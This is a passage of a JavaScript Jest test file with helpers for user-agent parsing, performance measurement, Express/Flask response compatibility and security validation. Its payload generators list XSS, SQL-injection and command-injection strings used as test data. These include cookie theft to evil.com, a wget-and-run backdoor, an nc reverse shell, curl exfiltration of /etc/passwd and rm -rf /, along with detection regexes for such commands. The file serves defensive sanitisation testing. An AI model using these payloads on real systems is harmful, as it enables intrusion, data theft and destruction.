      // Test legacy user agent handling
      const legacyUAs = [
        'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)', // IE8
        'Opera/9.80 (Windows NT 6.1; U; en) Presto/2.10.289 Version/12.02', // Old Opera
        'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)' // IE10
      ];
      
      legacyUAs.forEach(ua => {
        const parsed = parseUserAgent(ua);
        
        // Validate legacy handling
        expect(parsed).toHaveProperty('browser');
        expect(parsed).toHaveProperty('os');
        expect(parsed.browser.name).toBeDefined();
        expect(parsed.legacy).toBe(true);
      });
    });

    it('should provide comprehensive device capabilities analysis', () => {
      // Test device capabilities analysis
      const modernUA = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36';
      const parsed = parseUserAgent(modernUA);
      
      // Validate capabilities analysis
      expect(parsed.capabilities).toHaveProperty('javascript', true);
      expect(parsed.capabilities).toHaveProperty('cookies', true);
      expect(parsed.capabilities).toHaveProperty('webgl');
      expect(parsed.capabilities).toHaveProperty('touchscreen');
      expect(parsed.capabilities).toHaveProperty('geolocation');
      
      // Platform-specific capabilities
      if (parsed.os.name === 'Windows') {
        expect(parsed.capabilities.touchscreen).toBeDefined();
      }
    });
  });
});

/**
 * Test Environment Setup and Utility Functions
 * Implements comprehensive test environment initialization, cleanup,
 * and specialized testing utilities for helper function validation
 */

/**
 * Setup Test Environment
 * Initializes comprehensive testing environment with all necessary utilities
 */
async function setupTestEnvironment() {
  // Initialize test environment configuration
  const environment = {
    startTime: Date.now(),
    processId: process.pid,
    nodeVersion: process.version,
    testRunner: 'Jest'
  };
  
  // Set up performance monitoring
  const performanceBaseline = process.memoryUsage();
  environment.performanceBaseline = performanceBaseline;
  
  // Initialize mock data generators
  environment.mockGenerators = {
    users: mockDataHelper?.createUserGenerator() || (() => ({ id: 1, name: 'Test User', email: 'test@example.com' })),
    responses: mockDataHelper?.createResponseGenerator() || (() => ({ status: 200, data: 'Test response' })),
    errors: mockDataHelper?.createErrorGenerator() || (() => new Error('Test error'))
  };
  
  // Set up security test utilities
  environment.securityUtils = {
    xssPayloads: await generateXSSTestPayloads(),
    sqlInjectionPatterns: generateSQLInjectionPatterns(),
    commandInjectionPatterns: generateCommandInjectionPatterns()
  };
  
  // Initialize performance measurement utilities
  environment.performanceUtils = {
    measureExecutionTime: (fn) => {
      const start = process.hrtime.bigint();
      const result = fn();
      const end = process.hrtime.bigint();
      return {
        result,
        executionTime: Number(end - start) / 1000000 // Convert to milliseconds
      };
    },
    measureMemoryUsage: () => process.memoryUsage(),
    createPerformanceProfile: () => ({
      timestamp: Date.now(),
      memory: process.memoryUsage(),
      uptime: process.uptime()
    })
  };
  
  return environment;
}

/**
 * Cleanup Test Environment
 * Performs comprehensive cleanup of test environment resources
 */
async function cleanupTestEnvironment() {
  // Clear all timeouts and intervals
  if (global.setTimeout.mockClear) {
    global.setTimeout.mockClear();
  }
  if (global.setInterval.mockClear) {
    global.setInterval.mockClear();
  }
  
  // Reset global state
  delete global.testEnvironment;
  
  // Trigger garbage collection hint
  if (global.gc) {
    global.gc();
  }
  
  // Final performance measurement
  const finalMemory = process.memoryUsage();
  
  return {
    cleanupCompleted: true,
    finalMemoryUsage: finalMemory,
    cleanupTime: Date.now()
  };
}

/**
 * Validate Helper Function - Generic utility function validation
 */
async function validateHelperFunction(helperFunction, testCases, validationOptions = {}) {
  const results = {
    totalTests: testCases.length,
    passed: 0,
    failed: 0,
    errors: [],
    performanceMetrics: [],
    startTime: Date.now()
  };
  
  for (const testCase of testCases) {
    try {
      // Measure performance for each test case
      const startTime = process.hrtime.bigint();
      
      let result;
      if (typeof helperFunction === 'function') {
        result = await helperFunction(...testCase.inputs);
      } else {
        throw new Error('Helper function is not callable');
      }
      
      const endTime = process.hrtime.bigint();
      const executionTime = Number(endTime - startTime) / 1000000; // Convert to ms
      
      // Validate result against expected outcome
      if (testCase.expected !== undefined) {
        if (JSON.stringify(result) === JSON.stringify(testCase.expected)) {
          results.passed++;
        } else {
          results.failed++;
          results.errors.push({
            testCase: testCase.description || 'Unnamed test',
            expected: testCase.expected,
            actual: result,
            type: 'assertion_failure'
          });
        }
      } else {
        // If no expected result, just check for no errors
        results.passed++;
      }
      
      // Record performance metrics
      results.performanceMetrics.push({
        testCase: testCase.description || 'Unnamed test',
        executionTime,
        memoryDelta: validationOptions.measureMemory ? 
          process.memoryUsage().heapUsed - testCase.baselineMemory : 0
      });
      
    } catch (error) {
      results.failed++;
      results.errors.push({
        testCase: testCase.description || 'Unnamed test',
        error: error.message,
        stack: error.stack,
        type: 'execution_error'
      });
    }
  }
  
  results.endTime = Date.now();
  results.totalTime = results.endTime - results.startTime;
  results.successRate = (results.passed / results.totalTests) * 100;
  
  return results;
}

/**
 * Create Test Case - Helper for generating comprehensive test cases
 */
function createTestCase(testType, testConfig = {}) {
  const baseTestCase = {
    id: Math.random().toString(36).substr(2, 9),
    type: testType,
    createdAt: new Date(),
    config: testConfig
  };
  
  switch (testType) {
    case 'security':
      return {
        ...baseTestCase,
        inputs: generateSecurityTestInputs(testConfig),
        expectedBehavior: 'safe_output',
        validationRules: ['no_script_tags', 'no_sql_injection', 'no_command_injection']
      };
      
    case 'performance':
      return {
        ...baseTestCase,
        inputs: generatePerformanceTestInputs(testConfig),
        expectedBehavior: 'within_time_limit',
        performanceTargets: {
          maxExecutionTime: testConfig.maxTime || 100,
          maxMemoryUsage: testConfig.maxMemory || 10 * 1024 * 1024 // 10MB
        }
      };
      
    case 'edge_case':
      return {
        ...baseTestCase,
        inputs: generateEdgeCaseInputs(testConfig),
        expectedBehavior: 'graceful_handling',
        validationRules: ['no_crashes', 'consistent_output_type']
      };
      
    default:
      return {
        ...baseTestCase,
        inputs: [testConfig.input || 'test'],
        expected: testConfig.expected || 'test',
        description: testConfig.description || 'Basic test case'
      };
  }
}

/**
 * Measure Test Performance - Specialized performance measurement
 */
async function measureTestPerformance(testFunction, testInputs, performanceConfig = {}) {
  const iterations = performanceConfig.iterations || 100;
  const measurements = [];
  const memoryMeasurements = [];
  
  // Baseline memory measurement
  const baselineMemory = process.memoryUsage();
  
  for (let i = 0; i < iterations; i++) {
    const input = Array.isArray(testInputs) ? testInputs[i % testInputs.length] : testInputs;
    
    // Memory measurement before execution
    const memoryBefore = process.memoryUsage();
    
    // Performance measurement
    const startTime = process.hrtime.bigint();
    
    try {
      await testFunction(input);
    } catch (error) {
      // Continue measurement even if function throws
    }
    
    const endTime = process.hrtime.bigint();
    const executionTime = Number(endTime - startTime) / 1000000; // Convert to ms
    
    // Memory measurement after execution
    const memoryAfter = process.memoryUsage();
    
    measurements.push(executionTime);
    memoryMeasurements.push({
      heapUsedDelta: memoryAfter.heapUsed - memoryBefore.heapUsed,
      heapTotalDelta: memoryAfter.heapTotal - memoryBefore.heapTotal
    });
  }
  
  // Calculate statistics
  const sorted = measurements.slice().sort((a, b) => a - b);
  const sum = measurements.reduce((a, b) => a + b, 0);
  
  return {
    iterations,
    averageTime: sum / iterations,
    medianTime: sorted[Math.floor(sorted.length / 2)],
    minTime: Math.min(...measurements),
    maxTime: Math.max(...measurements),
    percentile95: sorted[Math.floor(sorted.length * 0.95)],
    standardDeviation: Math.sqrt(
      measurements.reduce((sq, n) => sq + Math.pow(n - (sum / iterations), 2), 0) / iterations
    ),
    memoryUsage: {
      averageHeapDelta: memoryMeasurements.reduce((sum, m) => sum + m.heapUsedDelta, 0) / iterations,
      maxHeapDelta: Math.max(...memoryMeasurements.map(m => m.heapUsedDelta)),
      baselineMemory
    }
  };
}

/**
 * Validate Security Aspects - Comprehensive security validation
 */
async function validateSecurityAspects(securityFunction, securityTestCases) {
  const securityResults = {
    totalTests: securityTestCases.length,
    passed: 0,
    failed: 0,
    vulnerabilities: [],
    securityScore: 0
  };
  
  for (const testCase of securityTestCases) {
    try {
      const result = await securityFunction(testCase.input);
      
      // Check for XSS vulnerabilities
      if (testCase.type === 'xss') {
        const hasScriptTags = /<script[\s\S]*?>[\s\S]*?<\/script>/gi.test(result);
        const hasJavascriptUrls = /javascript:/gi.test(result);
        const hasEventHandlers = /on\w+\s*=/gi.test(result);
        
        if (hasScriptTags || hasJavascriptUrls || hasEventHandlers) {
          securityResults.vulnerabilities.push({
            type: 'XSS',
            input: testCase.input,
            output: result,
            severity: 'high'
          });
          securityResults.failed++;
        } else {
          securityResults.passed++;
        }
      }
      
      // Check for SQL injection vulnerabilities
      if (testCase.type === 'sql_injection') {
        const hasSqlKeywords = /(drop\s+table|union\s+select|select\s+.*\s+from)/gi.test(result);
        const hasSqlComments = /(--|\/\*|\*\/)/gi.test(result);
        
        if (hasSqlKeywords || hasSqlComments) {
          securityResults.vulnerabilities.push({
            type: 'SQL_INJECTION',
            input: testCase.input,
            output: result,
            severity: 'critical'
          });
          securityResults.failed++;
        } else {
          securityResults.passed++;
        }
      }
      
      // Check for command injection vulnerabilities
      if (testCase.type === 'command_injection') {
        const hasCommandChars = /[;&|`$\(\)]/gi.test(result);
        const hasCommandKeywords = /(rm\s+-rf|cat\s+\/etc\/passwd|wget|curl)/gi.test(result);
        
        if (hasCommandChars || hasCommandKeywords) {
          securityResults.vulnerabilities.push({
            type: 'COMMAND_INJECTION',
            input: testCase.input,
            output: result,
            severity: 'critical'
          });
          securityResults.failed++;
        } else {
          securityResults.passed++;
        }
      }
      
    } catch (error) {
      securityResults.failed++;
      securityResults.vulnerabilities.push({
        type: 'EXECUTION_ERROR',
        input: testCase.input,
        error: error.message,
        severity: 'medium'
      });
    }
  }
  
  securityResults.securityScore = (securityResults.passed / securityResults.totalTests) * 100;
  
  return securityResults;
}

/**
 * Test Cross-Platform Compatibility
 */
function testCrossPlatformCompatibility(expressData, expectedFlaskFormat) {
  const compatibilityResults = {
    compatible: true,
    differences: [],
    score: 0
  };
  
  // Check status code compatibility
  if (expressData.statusCode !== expectedFlaskFormat.status_code) {
    compatibilityResults.compatible = false;
    compatibilityResults.differences.push({
      field: 'statusCode',
      express: expressData.statusCode,
      flask: expectedFlaskFormat.status_code,
      severity: 'high'
    });
  }
  
  // Check content type compatibility
  const expressContentType = expressData.headers?.['Content-Type'];
  const flaskContentType = expectedFlaskFormat.headers?.['Content-Type'];
  
  if (expressContentType !== flaskContentType) {
    compatibilityResults.compatible = false;
    compatibilityResults.differences.push({
      field: 'Content-Type',
      express: expressContentType,
      flask: flaskContentType,
      severity: 'medium'
    });
  }
  
  // Check response body compatibility
  try {
    const expressBody = typeof expressData.body === 'string' ? 
      JSON.parse(expressData.body) : expressData.body;
    const flaskBody = expectedFlaskFormat.data;
    
    if (JSON.stringify(expressBody) !== JSON.stringify(flaskBody)) {
      compatibilityResults.compatible = false;
      compatibilityResults.differences.push({
        field: 'responseBody',
        express: expressBody,
        flask: flaskBody,
        severity: 'high'
      });
    }
  } catch (error) {
    // Handle non-JSON responses
    if (expressData.body !== expectedFlaskFormat.data) {
      compatibilityResults.compatible = false;
      compatibilityResults.differences.push({
        field: 'responseBody',
        express: expressData.body,
        flask: expectedFlaskFormat.data,
        severity: 'high'
      });
    }
  }
  
  // Calculate compatibility score
  const totalChecks = 3; // status, content-type, body
  const failedChecks = compatibilityResults.differences.length;
  compatibilityResults.score = ((totalChecks - failedChecks) / totalChecks) * 100;
  
  return compatibilityResults;
}

/**
 * Run Async Tests - Comprehensive async testing utility
 */
async function runAsyncTests(asyncFunction, asyncTestConfig = {}) {
  const asyncResults = {
    totalTests: 0,
    passed: 0,
    failed: 0,
    timeouts: 0,
    errors: [],
    performanceMetrics: []
  };
  
  const testCases = asyncTestConfig.testCases || [
    { description: 'Basic async execution', input: 'test' },
    { description: 'Promise resolution', input: Promise.resolve('resolved') },
    { description: 'Promise rejection', input: Promise.reject(new Error('rejected')), expectError: true }
  ];
  
  asyncResults.totalTests = testCases.length;
  
  for (const testCase of testCases) {
    const testStartTime = Date.now();
    
    try {
      // Set up timeout handling
      const timeoutPromise = new Promise((_, reject) => 
        setTimeout(() => reject(new Error('Test timeout')), asyncTestConfig.timeout || 5000)
      );
      
      // Execute async function with timeout
      const result = await Promise.race([
        asyncFunction(testCase.input),
        timeoutPromise
      ]);
      
      const executionTime = Date.now() - testStartTime;
      
      // Validate result based on test case expectations
      if (testCase.expectError && !result.error) {
        asyncResults.failed++;
        asyncResults.errors.push({
          testCase: testCase.description,
          error: 'Expected error but got success',
          type: 'expectation_mismatch'
        });
      } else if (!testCase.expectError && result.error) {
        asyncResults.failed++;
        asyncResults.errors.push({
          testCase: testCase.description,
          error: result.error,
          type: 'unexpected_error'
        });
      } else {
        asyncResults.passed++;
      }
      
      // Record performance metrics
      asyncResults.performanceMetrics.push({
        testCase: testCase.description,
        executionTime,
        success: !result.error
      });
      
    } catch (error) {
      const executionTime = Date.now() - testStartTime;
      
      if (error.message === 'Test timeout') {
        asyncResults.timeouts++;
      } else if (testCase.expectError) {
        asyncResults.passed++;
      } else {
        asyncResults.failed++;
        asyncResults.errors.push({
          testCase: testCase.description,
          error: error.message,
          stack: error.stack,
          type: 'execution_error'
        });
      }
      
      asyncResults.performanceMetrics.push({
        testCase: testCase.description,
        executionTime,
        success: false,
        errorType: error.message === 'Test timeout' ? 'timeout' : 'error'
      });
    }
  }
  
  return asyncResults;
}

/**
 * Generate XSS Test Payloads - Security testing utility
 */
async function generateXSSTestPayloads() {
  return [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')">',
    '<svg onload="alert(1)">',
    'javascript:alert("XSS")',
    '<iframe src="javascript:alert(\'XSS\')"></iframe>',
    '<body onload="alert(\'XSS\')">',
    '"><script>alert("XSS")</script>',
    '\'-alert(\'XSS\')-\'',
    '<script>document.location="http://evil.com/"+document.cookie</script>',
    '<div onclick="alert(\'XSS\')">Click me</div>'
  ];
}

/**
 * Generate SQL Injection Patterns
 */
function generateSQLInjectionPatterns() {
  return [
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "1' UNION SELECT password FROM users --",
    "admin'--",
    "' OR 1=1#",
    "'; INSERT INTO users (username, password) VALUES ('hacker', 'password'); --",
    "1' AND (SELECT COUNT(*) FROM users) > 0 --",
    "' UNION SELECT username, password FROM users WHERE ''='",
    "1'; EXEC xp_cmdshell('net user hacker password /add'); --",
    "' OR (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a"
  ];
}

/**
 * Generate Command Injection Patterns
 */
function generateCommandInjectionPatterns() {
  return [
    "; rm -rf /",
    "| cat /etc/passwd",
    "; wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh; chmod +x /tmp/backdoor.sh; /tmp/backdoor.sh",
    "$(whoami)",
    "`id`",
    "; echo 'hacker' > /etc/passwd",
    "| nc -e /bin/sh evil.com 4444",
    "; curl -X POST -d @/etc/passwd http://evil.com/exfiltrate",
    "$(curl -s http://evil.com/malware.sh | bash)",
    "; python -c \"import os; os.system('rm -rf /')\""
  ];
}

/**
 * Generate Security Test Inputs
 */
function generateSecurityTestInputs(config) {
  const inputs = [];
  
  if (config.includeXSS !== false) {
    inputs.push(...generateXSSTestPayloads());
  }
  
  if (config.includeSQLInjection !== false) {
    inputs.push(...generateSQLInjectionPatterns());
  }
  
  if (config.includeCommandInjection !== false) {
    inputs.push(...generateCommandInjectionPatterns());
  }
  
  return inputs;
}

/**
 * Generate Performance Test Inputs
 */
function generatePerformanceTestInputs(config) {
  const inputs = [];
  const size = config.inputSize || 1000;
  
  // Generate various input sizes for performance testing
  for (let i = 1; i <= size; i *= 10) {
    inputs.push('x'.repeat(i));
    inputs.push({ data: 'y'.repeat(i) });
    inputs.push(Array(i).fill('z'));
  }
  
  return inputs;
}

/**
 * Generate Edge Case Inputs
 */
function generateEdgeCaseInputs(config) {
  return [
    null,
    undefined,
    '',
    0,
    -1,
    Number.MAX_SAFE_INTEGER,
    Number.MIN_SAFE_INTEGER,
    NaN,
    Infinity,
    -Infinity,
    {},
    [],
    function() {},
    Symbol('test'),
    new Date(),
    /regex/,
    new Error('test error'),
    Buffer.from('test'),
    ''.repeat(10000), // Very long string
    { circular: null } // Will be made circular
  ];
}

/**
 * Validate Test Data - Schema validation utility
 */
function validateTestData(data, schema) {
  try {
    // Basic schema validation implementation
    if (schema.type === 'object' && typeof data === 'object' && data !== null) {
      if (schema.required) {
        for (const prop of schema.required) {
          if (!(prop in data)) {
            return false;
          }
        }
      }
      
      if (schema.properties) {
        for (const [prop, propSchema] of Object.entries(schema.properties)) {
          if (prop in data) {
            if (propSchema.type && typeof data[prop] !== propSchema.type) {
              return false;
            }
          }
        }
      }
      
      return true;
    }
    
    return schema.type ? typeof data === schema.type : true;
  } catch (error) {
    return false;
  }
}